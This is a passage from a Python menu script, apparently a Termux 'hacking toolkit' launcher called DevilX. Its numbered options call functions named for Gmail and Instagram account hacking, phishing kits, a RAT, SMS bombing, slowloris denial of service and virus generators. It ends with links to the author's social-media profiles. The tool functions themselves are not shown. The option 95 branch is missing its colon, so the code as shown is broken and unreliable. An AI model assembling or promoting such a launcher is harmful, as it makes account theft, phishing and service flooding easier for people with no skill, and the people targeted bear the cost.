                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '31' :
                os.system('clear')
                print(banner)
                print()
                print()
                GHINSTA()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '32' :
                os.system('clear')
                print(banner)
                print()
                print()
                GmailHack()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '33' :
                os.system('clear')
                print(banner)
                print()
                print()
                Hacked()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '34' :
                os.system('clear')
                print(banner)
                print()
                print()
                Hackerwasi()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '35' :
                os.system('clear')
                print(banner)
                print()
                print()
                hacklock()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '36' :
                os.system('clear')
                print(banner)
                print()
                print()
                Hammer()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '37' :
                os.system('clear')
                print(banner)
                print()
                print()
                HCORat()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '38' :
                os.system('clear')
                print(banner)
                print()
                print()
                hsploit()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '39' :
                os.system('clear')
                print(banner)
                print()
                print()
                httpfy()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '40' :
                os.system('clear')
                print(banner)
                print()
                print()
                hsxpduky()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '41' :
                os.system('clear')
                print(banner)
                print()
                print()
                infect()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '42' :
                os.system('clear')
                print(banner)
                print()
                print()
                infogx()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '43' :
                os.system('clear')
                print(banner)
                print()
                print()
                instahack()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '44' :
                os.system('clear')
                print(banner)
                print()
                print()
                InstaReport()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '45' :
                os.system('clear')
                print(banner)
                print()
                print()
                ipdrone()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '46' :
                os.system('clear')
                print(banner)
                print()
                print()
                IPRover()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '47' :
                os.system('clear')
                print(banner)
                print()
                print()
                jarvswlcm()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '48' :
                os.system('clear')
                print(banner)
                print()
                print()
                kalimux()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '49' :
                os.system('clear')
                print(banner)
                print()
                print()
                kissnt()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '50' :
                os.system('clear')
                print(banner)
                print()
                print()
                LinuxX()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '51' :
                os.system('clear')
                print(banner)
                print()
                print()
                LordPhish()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '52' :
                os.system('clear')
                print(banner)
                print()
                print()
                Lucifer()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '53' :
                os.system('clear')
                print(banner)
                print()
                print()
                maskphish()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '54' :
                os.system('clear')
                print(banner)
                print()
                print()
                Mdork()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '55' :
                os.system('clear')
                print(banner)
                print()
                print()
                megafile()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '56' :
                os.system('clear')
                print(banner)
                print()
                print()
                metasp()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '57' :
                os.system('clear')
                print(banner)
                print()
                print()
                mubuntu()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '58' :
                os.system('clear')
                print(banner)
                print()
                print()
                mrphish()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '59' :
                os.system('clear')
                print(banner)
                print()
                print()
                MyServer()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '60' :
                os.system('clear')
                print(banner)
                print()
                print()
                netscan()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '61' :
                os.system('clear')
                print(banner)
                print()
                print()
                nikto()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '62' :
                os.system('clear')
                print(banner)
                print()
                print()
                nmap()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '63' :
                os.system('clear')
                print(banner)
                print()
                print()
                onex()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '64' :
                os.system('clear')
                print(banner)
                print()
                print()
                osiig()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '65' :
                os.system('clear')
                print(banner)
                print()
                print()
                Osintgram()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '66' :
                os.system('clear')
                print(banner)
                print()
                print()
                partterx()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '67' :
                os.system('clear')
                print(banner)
                print()
                print()
                PassX()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '68' :
                os.system('clear')
                print(banner)
                print()
                print()
                bgmip()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '69' :
                os.system('clear')
                print(banner)
                print()
                print()
                Pureblood()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '70' :
                os.system('clear')
                print(banner)
                print()
                print()
                Pycompile()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '71' :
                os.system('clear')
                print(banner)
                print()
                print()
                qurxin()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '72' :
                os.system('clear')
                print(banner)
                print()
                print()
                REDHAWK()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '73' :
                os.system('clear')
                print(banner)
                print()
                print()
                rsecxxx()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '74' :
                os.system('clear')
                print(banner)
                print()
                print()
                saycheese()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '75' :
                os.system('clear')
                print(banner)
                print()
                print()
                ScannerX()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '76' :
                os.system('clear')
                print(banner)
                print()
                print()
                seeker()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '77' :
                os.system('clear')
                print(banner)
                print()
                print()
                seeu()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '78' :
                os.system('clear')
                print(banner)
                print()
                print()
                sortby()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '79' :
                os.system('clear')
                print(banner)
                print()
                print()
                slowloris()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '80' :
                os.system('clear')
                print(banner)
                print()
                print()
                toolboxt()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '81' :
                os.system('clear')
                print(banner)
                print()
                print()
                SploitX()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '82' :
                os.system('clear')
                print(banner)
                print()
                print()
                sqlmap()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '83' :
                os.system('clear')
                print(banner)
                print()
                print()
                tbomb()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '84' :
                os.system('clear')
                print(banner)
                print()
                print()
                tscrap()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '85' :
                os.system('clear')
                print(banner)
                print()
                print()
                TermuxArch()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '86' :
                os.system('clear')
                print(banner)
                print()
                print()
                TermuxCyberArmy()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '87' :
                os.system('clear')
                print(banner)
                print()
                print()
                tdesktp()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '88' :
                os.system('clear')
                print(banner)
                print()
                print()
                tfingrp()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '89' :
                os.system('clear')
                print(banner)
                print()
                print()
                heroku()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '90' :
                os.system('clear')
                print(banner)
                print()
                print()
                termuxkey()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '91' :
                os.system('clear')
                print(banner)
                print()
                print()
                termuxsnippets()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '92' :
                os.system('clear')
                print(banner)
                print()
                print()
                hydra()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '93' :
                os.system('clear')
                print(banner)
                print()
                print()
                toolss()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '94' :
                os.system('clear')
                print(banner)
                print()
                print()
                toolx()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '95' 
                os.system('clear')
                print(banner)
                print()
                print()
                TORhunter()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '96' :
                os.system('clear')
                print(banner)
                print()
                print()
                tracex()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '97' :
                os.system('clear')
                print(banner)
                print()
                print()
                trcexgui()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '98' :
                os.system('clear')
                print(banner)
                print()
                print()
                traperx()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '99' :
                os.system('clear')
                print(banner)
                print()
                print()
                tstyle()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '100' :
                os.system('clear')
                print(banner)
                print()
                print()
                tunnel()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '101' :
                os.system('clear')
                print(banner)
                print()
                print()
                userfinder()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '102' :
                os.system('clear')
                print(banner)
                print()
                print()
                Venomsploit()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '103' :
                os.system('clear')
                print(banner)
                print()
                print()
                Viridae()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '104' :
                os.system('clear')
                print(banner)
                print()
                print()
                WannaTool()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '105' :
                os.system('clear')
                print(banner)
                print()
                print()
                websploit()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '106' :
                os.system('clear')
                print(banner)
                print()
                print()
                WhSms()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '107' :
                os.system('clear')
                print(banner)
                print()
                print()
                Xteam()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '108' :
                os.system('clear')
                print(banner)
                print()
                print()
                ytpro()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '109' :
                os.system('clear')
                print(banner)
                print()
                print()
                zphish()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == '110' :
                os.system('clear')
                print(banner)
                print()
                print()
                zvirusg()
                print()
                input('\033[1;94mPress ENTER To Continue')

            elif tolis == 'B' or tolis == 'b':
                print()
                print("\033[1;91m[*] \033[1;97mGetting Back...")
                sleep(0.8)
                break

            elif tolis == "Q" or tolis == "q":
                print()
                print("\033[1;91m[*] Quitting...")
                print()
                sleep(0.9)
                exit()

            else:
                print()
                print("\033[1;91m[*] Invalid input")
                sleep(0.8)
                print()


    elif mainx == "7" or mainx == "07":
        print()
        while True:
            os.system("clear")
            print(banner)
            print()
            print("\033[1;91m[*] \033[1;97mThanks for using my tool '\033[1;91mDevilX\033[1;97m'. So you can follow me on various social media site. Link and options are given down below, So select here options where you want to follow me ")
            print()
            fol = input(soc)
            if fol == '1' or fol == '01':
                print()
                print("\033[1;91m[*] \033[1;97mOpening my Instagram profile in your device \n")
                sleep(0.8)
                os.system("xdg-open https://instagram.com/0hacker_x0")
            
            elif fol == '2' or fol == '02':
                print()
                print("\033[1;91m[*] \033[1;97mOpening my Facebook page in your device \n")
                sleep(0.8)
                os.system("xdg-open https://facebook.com/hackerxmr")

            elif fol == '3' or fol == '03':
                print()
                print("\033[1;91m[*] \033[1;97mOpening my Github profile in your device \n")
                sleep(0.8)
                os.system("xdg-open https://github.com/MrHacker-X")

            elif fol == '4' or fol == '04':
                print()
                print("\033[1;91m[*] \033[1;97mOpening my YouTube channel in your device \n")
                sleep(0.8)
                os.system("xdg-open https://youtube.com/@Technolex")
            
            elif fol == '5' or fol == '05':
                print()
                print("\033[1;91m[*] \033[1;97mOpening my Telegram Channel in your device \n")
                sleep(0.8)
                os.system("xdg-open https://t.me/hackwithalex")

            elif fol == '95':
                print()
                print("\033[1;91m[*]\033[1;97m Getting Back...\n")
                sleep(0.8)
                break

            elif fol == '99':
                print()
                print("\033[1;91m[*]\033[1;97m Quiting...\n")
                sleep(0.8)
                exit()

            elif fol == '':
                print()
                print("\033[1;91m[!] No input detected")
                print()
                sleep(0.7)

            else:
                print()
                print("\033[1;91m[!] Invalid Input")
                sleep(0.8)
                print()

############################## About print scetion ################################

    elif mainx == "8" or mainx == "08":
        os.system("clear")
        print(banner)
        print()
        print(about)
        print()
        input("\033[1;94mPress ENTER To Continue")

    elif mainx == "99":
        print()
        print("\033[1;91m[*]\033[1;97m Quiting...\n")
        sleep(0.9)
        exit()

    else:
        print("\n\033[1;91m[!] Invalid input\n")
        sleep(0.9)

############################## End here ###############################
